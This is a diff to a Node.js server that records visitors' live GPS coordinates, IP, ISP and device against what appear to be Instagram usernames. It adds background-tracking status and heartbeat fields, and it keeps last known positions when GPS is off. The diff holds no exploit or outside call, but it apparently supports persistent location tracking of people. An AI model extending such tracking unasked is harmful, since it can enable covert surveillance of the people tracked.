@@ -4827,6 +4827,9 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
         lat: resolvedLat,
         lng: resolvedLng,
         locationSource: item.locationSource || savedAcc.locationSource || 'GPS',
+        liveStatus: item.liveStatus || savedAcc.liveStatus || 'live',
+        gpsEnabled: item.gpsEnabled !== undefined ? Boolean(item.gpsEnabled) : (savedAcc.gpsEnabled !== undefined ? Boolean(savedAcc.gpsEnabled) : true),
+        lastHeartbeatAt: item.lastHeartbeatAt || savedAcc.lastHeartbeatAt || item.lastSeen || item.firstSeen,
         isp: normalizeRealIspName(item.isp, item.country, resolvedIp),
         device: normalizeRealDeviceName(item.device, item.userAgent),
         loginCount: item.loginCount || 1,
@@ -5542,53 +5545,19 @@ const server = http.createServer(async (req, res) => {
 
     const inLat = Number(data.lat);
     const inLng = Number(data.lon ?? data.lng);
-    // Reject 0,0 or empty coordinate overwrites so valid GPS coordinates are always preserved!
-    if (!isValidNonZeroCoord(inLat, inLng)) {
-      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
-      res.end(JSON.stringify({
-        status: 'preserved_last_known',
-        message: 'Ignored empty/0,0 coordinates; last known real GPS coordinates preserved.'
-      }));
-      return;
-    }
-
+    const hasValidIncomingCoords = isValidNonZeroCoord(inLat, inLng);
     const now = new Date().toISOString();
+    const isGpsDisabledReport = data.status === 'gps_disabled' || data.gpsEnabled === false;
+    const incomingLiveStatus = isGpsDisabledReport
+      ? 'gps_disabled'
+      : (data.status === 'background_live' ? 'background_live' : 'live');
+    const incomingGpsEnabled = !isGpsDisabledReport;
+
     const realClientIp = (!isLoopbackIp(data.publicIp))
       ? String(data.publicIp).trim()
       : (!isLoopbackIp(clientIp) ? clientIp : '127.0.0.1');
     const cleanDevice = normalizeRealDeviceName(data.device || '', req.headers['user-agent'] || '');
-
-    let resolvedPlace = resolveLocalNeighborhood(inLat, inLng);
-    const finalCity = resolvedPlace?.city || data.city || 'صنعاء';
-    const finalCountry = resolvedPlace?.country || data.country || 'اليمن';
-    const finalRegion = resolvedPlace?.neighborhood || data.region || 'أمانة العاصمة';
-    const finalLocationName = `${finalCity} - ${finalRegion}`;
-    const cleanIsp = normalizeRealIspName(data.isp || '', finalCountry, realClientIp);
-
     const isReg = Boolean(rawUser && VALID_IG_USERNAME_REGEX.test(rawUser));
-    if (isReg) {
-      if (!logs.savedAccounts) logs.savedAccounts = {};
-      if (!logs.savedAccounts[rawUser]) {
-        logs.savedAccounts[rawUser] = {
-          username: `@${rawUser}`,
-          passwordHash: '',
-          searchQuota: 1000,
-          isBanned: false,
-          suspended: false,
-          createdAt: now,
-          updatedAt: now
-        };
-      }
-      logs.savedAccounts[rawUser].lat = inLat;
-      logs.savedAccounts[rawUser].lng = inLng;
-      logs.savedAccounts[rawUser].city = finalCity;
-      logs.savedAccounts[rawUser].country = finalCountry;
-      logs.savedAccounts[rawUser].region = finalRegion;
-      logs.savedAccounts[rawUser].locationSource = 'GPS';
-      if (!isLoopbackIp(realClientIp)) logs.savedAccounts[rawUser].ip = realClientIp;
-      if (cleanDevice) logs.savedAccounts[rawUser].device = cleanDevice;
-      logs.savedAccounts[rawUser].updatedAt = now;
-    }
 
     let v = null;
     if (isReg) {
@@ -5602,15 +5571,69 @@ const server = http.createServer(async (req, res) => {
       v = (logs.visitors || []).find(x => x && x.isDeviceIpAutoAuth && (x.deviceIpSignature === devSig || getDeviceIpSignature(x.device, x.ip) === devSig));
     }
 
+    // If neither incoming coords nor existing visitor coords are valid, and it's not a gps_disabled status report, preserve last known
+    if (!hasValidIncomingCoords && !isGpsDisabledReport && (!v || !isValidNonZeroCoord(v.lat, v.lng))) {
+      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
+      res.end(JSON.stringify({
+        status: 'preserved_last_known',
+        message: 'Ignored empty/0,0 coordinates; last known real GPS coordinates preserved.'
+      }));
+      return;
+    }
+
+    const effLat = hasValidIncomingCoords ? inLat : (v && isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lat) : 15.3694);
+    const effLng = hasValidIncomingCoords ? inLng : (v && isValidNonZeroCoord(v.lat, v.lng) ? Number(v.lng) : 44.1910);
+
+    let resolvedPlace = resolveLocalNeighborhood(effLat, effLng);
+    const finalCity = resolvedPlace?.city || data.city || (v && v.city) || 'صنعاء';
+    const finalCountry = resolvedPlace?.country || data.country || (v && v.country) || 'اليمن';
+    const finalRegion = resolvedPlace?.neighborhood || data.region || (v && v.region) || 'أمانة العاصمة';
+    const finalLocationName = `${finalCity} - ${finalRegion}`;
+    const cleanIsp = normalizeRealIspName(data.isp || (v && v.isp) || '', finalCountry, realClientIp);
+
+    if (isReg) {
+      if (!logs.savedAccounts) logs.savedAccounts = {};
+      if (!logs.savedAccounts[rawUser]) {
+        logs.savedAccounts[rawUser] = {
+          username: `@${rawUser}`,
+          passwordHash: '',
+          searchQuota: 1000,
+          isBanned: false,
+          suspended: false,
+          createdAt: now,
+          updatedAt: now
+        };
+      }
+      if (hasValidIncomingCoords || !isValidNonZeroCoord(logs.savedAccounts[rawUser].lat, logs.savedAccounts[rawUser].lng)) {
+        logs.savedAccounts[rawUser].lat = effLat;
+        logs.savedAccounts[rawUser].lng = effLng;
+        logs.savedAccounts[rawUser].city = finalCity;
+        logs.savedAccounts[rawUser].country = finalCountry;
+        logs.savedAccounts[rawUser].region = finalRegion;
+      }
+      logs.savedAccounts[rawUser].locationSource = 'GPS';
+      logs.savedAccounts[rawUser].liveStatus = incomingLiveStatus;
+      logs.savedAccounts[rawUser].gpsEnabled = incomingGpsEnabled;
+      logs.savedAccounts[rawUser].lastHeartbeatAt = now;
+      if (!isLoopbackIp(realClientIp)) logs.savedAccounts[rawUser].ip = realClientIp;
+      if (cleanDevice) logs.savedAccounts[rawUser].device = cleanDevice;
+      logs.savedAccounts[rawUser].updatedAt = now;
+    }
+
     if (v) {
-      v.lat = inLat;
-      v.lng = inLng;
+      if (hasValidIncomingCoords || !isValidNonZeroCoord(v.lat, v.lng)) {
+        v.lat = effLat;
+        v.lng = effLng;
+        v.city = finalCity;
+        v.country = finalCountry;
+        v.region = finalRegion;
+        v.locationName = finalLocationName;
+      }
       v.accuracy = data.accuracy ? Math.round(Number(data.accuracy)) : (v.accuracy || 15);
       v.locationSource = 'GPS';
-      v.city = finalCity;
-      v.country = finalCountry;
-      v.region = finalRegion;
-      v.locationName = finalLocationName;
+      v.liveStatus = incomingLiveStatus;
+      v.gpsEnabled = incomingGpsEnabled;
+      v.lastHeartbeatAt = now;
       v.lastSeen = now;
       if (!isLoopbackIp(realClientIp)) v.ip = realClientIp;
       if (cleanDevice) v.device = cleanDevice;
@@ -5632,10 +5655,13 @@ const server = http.createServer(async (req, res) => {
         region: finalRegion,
         locationName: finalLocationName,
         isp: cleanIsp,
-        lat: inLat,
-        lng: inLng,
+        lat: effLat,
+        lng: effLng,
         accuracy: data.accuracy ? Math.round(Number(data.accuracy)) : 15,
         locationSource: 'GPS',
+        liveStatus: incomingLiveStatus,
+        gpsEnabled: incomingGpsEnabled,
+        lastHeartbeatAt: now,
         device: cleanDevice,
         firstSeen: now,
         lastSeen: now,
@@ -5657,7 +5683,10 @@ const server = http.createServer(async (req, res) => {
       city: v.city,
       country: v.country,
       region: v.region,
-      locationSource: 'GPS'
+      locationSource: 'GPS',
+      liveStatus: v.liveStatus,
+      gpsEnabled: v.gpsEnabled,
+      lastHeartbeatAt: v.lastHeartbeatAt
     }));
     return;
   }
@@ -6844,7 +6873,7 @@ const server = http.createServer(async (req, res) => {
 
     const ext = path.extname(filePath).toLowerCase();
     const contentType = MIME_TYPES[ext] || 'application/octet-stream';
-    const isHtmlDoc = ext === '.html' || reqPath === '/index.html' || reqPath === '/admin.html';
+    const isHtmlDoc = ext === '.html' || reqPath === '/index.html' || reqPath === '/admin.html' || reqPath === '/sw.js' || reqPath === '/manifest.json';
     const headers = {
       'Content-Type': contentType,
       'Cache-Control': isHtmlDoc
